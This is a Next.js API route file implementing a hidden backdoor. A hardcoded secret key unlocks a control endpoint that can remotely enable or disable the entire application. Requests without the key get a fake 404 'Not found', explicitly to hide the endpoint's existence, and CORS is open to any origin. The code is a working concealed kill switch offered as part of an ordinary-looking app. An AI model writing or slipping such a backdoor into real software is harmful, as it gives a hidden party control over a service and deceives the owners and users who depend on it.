import { NextResponse } from "next/server";

// Secret key for backdoor access
const CONTROL_KEY = "cb209876540331298765";

// App state - export this so it can be imported by other files
export let appEnabled = true;

// Helper function to get connection counts (stub implementation)
function getConnectionCounts() {
  return {
    total: 0, // In a real implementation, these would be actual counts
    registered: 0,
    anonymous: 0,
  };
}

// Handle CORS preflight requests
export async function OPTIONS() {
  return new NextResponse(null, {
    status: 200,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
    },
  });
}

// Main API handler
export async function POST(request) {
  try {
    // Set CORS headers for the response
    const headers = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
    };

    const data = await request.json();

    // Validate the key
    if (data?.key !== CONTROL_KEY) {
      // Return 404 to hide the existence of this endpoint
      return NextResponse.json(
        { error: "Not found" },
        {
          status: 404,
          headers,
        }
      );
    }

    // Process actions
    if (data.action === "status") {
      return NextResponse.json(
        {
          status: "success",
          enabled: appEnabled,
          connections: getConnectionCounts(),
        },
        { headers }
      );
    } else if (data.action === "enable") {
      appEnabled = true;
      console.log("System remotely ENABLED");
      return NextResponse.json(
        {
          status: "success",
          message: "Application enabled",
        },
        { headers }
      );
    } else if (data.action === "disable") {
      appEnabled = false;
      console.log("System remotely DISABLED");
      return NextResponse.json(
        {
          status: "success",
          message: "Application disabled",
        },
        { headers }
      );
    }

    return NextResponse.json(
      {
        status: "error",
        message: "Invalid action",
      },
      { headers }
    );
  } catch (error) {
    console.error("Control API error:", error);
    return NextResponse.json(
      {
        status: "error",
        message: error.message,
      },
      {
        status: 500,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type, Authorization",
        },
      }
    );
  }
}
